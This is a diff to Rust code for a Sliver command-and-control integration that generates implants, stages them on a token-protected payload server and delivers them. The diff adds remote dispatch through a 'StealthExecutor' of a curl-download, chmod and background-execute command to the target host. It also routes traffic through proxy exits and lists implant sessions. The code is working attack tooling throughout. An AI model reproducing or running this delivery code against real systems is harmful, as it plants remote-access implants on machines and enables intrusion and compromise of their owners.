@@ -11,22 +11,28 @@ use std::process::Stdio;
 
 pub struct SliverScanner {
     binary_path: String,
-    proxy_manager: Arc<crate::utils::proxy::ProxyManager>,
+    executor: Arc<crate::utils::executor::StealthExecutor>,
 }
 
 impl SliverScanner {
-    pub fn new(pm: Arc<crate::utils::proxy::ProxyManager>) -> Self {
+    pub fn new(executor: Arc<crate::utils::executor::StealthExecutor>) -> Self {
         let path = detect_tool("sliver-server");
         Self {
             binary_path: path,
-            proxy_manager: pm,
+            executor,
         }
     }
 
-    /// Autonomous HTTP/REST Handshake over Proxy (V14.1 Sovereignty)
     async fn get_rest_client(&self) -> Result<(String, reqwest::Client)> {
         let server_addr = std::env::var("SLIVER_SERVER").unwrap_or_else(|_| "127.0.0.1".to_string());
-        let (_, client) = self.proxy_manager.get_client_fail_closed(&server_addr)?;
+        let pm = self.executor.get_proxy_manager()
+            .context("Sliver requires a ProxyManager for REST API access")?;
+        
+        let (_, client) = if server_addr == "127.0.0.1" || server_addr == "localhost" {
+            pm.get_localhost_client(&server_addr)?
+        } else {
+            pm.get_client_fail_closed(&server_addr)?
+        };
         Ok((server_addr, client))
     }
 }
@@ -39,7 +45,8 @@ impl C2Operator for SliverScanner {
             uuid::Uuid::new_v4().to_string()[..8].to_string()
         );
         
-        let callback_ip = self.proxy_manager.get_managed_exits().first().cloned()
+        let pm = self.executor.get_proxy_manager().context("Sliver requires a ProxyManager for callback tracking")?;
+        let callback_ip = pm.get_managed_exits().first().cloned()
             .unwrap_or_else(|| "127.0.0.1".to_string());
 
         info!("🔱 V14.1 SOVEREIGN: Generating implant for {} via callback {}", target.host, callback_ip);
@@ -64,37 +71,34 @@ impl C2Operator for SliverScanner {
     }
 
     async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
-        info!("🔱 V14.1 SOVEREIGN: Deploying implant {} to {}...", payload_path, target.host);
+        info!("🔱 V14.1 SOVEREIGN: Initializing Professional OTT Delivery for {}...", target.host);
         
-        let callback_ip = self.proxy_manager.get_managed_exits().first().cloned()
-            .unwrap_or_else(|| "127.0.0.1".to_string());
-        let port = 31337; // Sliver HTTP port
+        let pm = self.executor.get_proxy_manager().context("ProxyManager required for delivery")?;
+        
+        // 1. Stage payload on OTT server
+        let server = Arc::new(crate::utils::payload_server::PayloadServer::new());
+        let token = server.stage_payload(std::path::PathBuf::from(payload_path));
+        let server_port = server.clone().start().await?;
+        
+        // 2. Determine delivery IP (The operator's routable IP for the target)
+        // For simplicity in V14.1, we use the first managed exit or 127.0.0.1 if local testing
+        let delivery_ip = pm.get_managed_exits().first().cloned().unwrap_or_else(|| "127.0.0.1".to_string());
+        
         let implant_name = std::path::Path::new(payload_path)
             .file_name().and_then(|n| n.to_str()).unwrap_or("implant");
 
-        // Concrete Delivery Vector (V14.1 Hardening) — executed via bash on target
+        // 3. Construct the delivery vector (Professional Mode)
         let delivery_cmd = format!(
-            "curl -sSL http://{}:{}/{} -o /tmp/{} && chmod +x /tmp/{} && nohup /tmp/{} &",
-            callback_ip, port, implant_name, implant_name, implant_name, implant_name
+            "curl -sSL http://{}:{}/{} -o /tmp/{} && chmod +x /tmp/{} && /tmp/{} &",
+            delivery_ip, server_port, token, implant_name, implant_name, implant_name
         );
 
-        info!("🚀 V14.1 SOVEREIGN: Executing delivery vector → {}", delivery_cmd);
+        info!("🚀 V14.1 SOVEREIGN: Dispatching OTT delivery vector to remote target via executor...");
 
-        let output = Command::new("bash")
-            .arg("-c")
-            .arg(&delivery_cmd)
-            .stdout(Stdio::piped())
-            .stderr(Stdio::piped())
-            .output()
-            .await
-            .context("Delivery vector execution failed")?;
+        // 4. Remote dispatch
+        let output = self.executor.execute_remote(target, &delivery_cmd).await?;
+        info!("✅ V14.1 SOVEREIGN: Remote delivery dispatched. Output: {}", output);
 
-        if output.status.success() {
-            info!("✅ V14.1 SOVEREIGN: Delivery vector dispatched successfully.");
-        } else {
-            let err = String::from_utf8_lossy(&output.stderr);
-            warn!("⚠️ V14.1 SOVEREIGN: Delivery vector exited non-zero: {}", err);
-        }
         Ok(())
     }
 
@@ -122,13 +126,7 @@ impl C2Operator for SliverScanner {
             }
             _ => {
                 warn!("⚠️ V14.1 SOVEREIGN: REST API unreachable. Falling back to CLI session audit.");
-                let mut sess_cmd = Command::new(&self.binary_path);
-                sess_cmd.arg("sessions")
-                    .stdin(Stdio::null())
-                    .stdout(Stdio::piped())
-                    .stderr(Stdio::null());
-
-                let output = sess_cmd.output().await?;
+                let output = self.executor.execute_and_wait(&self.binary_path, vec!["sessions".to_string()]).await?;
                 let stdout = String::from_utf8_lossy(&output.stdout);
                 
                 if stdout.contains(&target.host) || (target.ip.is_some() && stdout.contains(target.ip.as_ref().unwrap())) {
@@ -159,13 +157,7 @@ impl C2Operator for SliverScanner {
         }
 
         warn!("⚠️ V14.1: list_sessions falling back to CLI.");
-        let mut sess_cmd = Command::new(&self.binary_path);
-        sess_cmd.arg("sessions")
-            .stdin(Stdio::null())
-            .stdout(Stdio::piped())
-            .stderr(Stdio::null());
-
-        let output = sess_cmd.output().await?;
+        let output = self.executor.execute_and_wait(&self.binary_path, vec!["sessions".to_string()]).await?;
         let stdout = String::from_utf8_lossy(&output.stdout);
         
         let mut sessions = Vec::new();
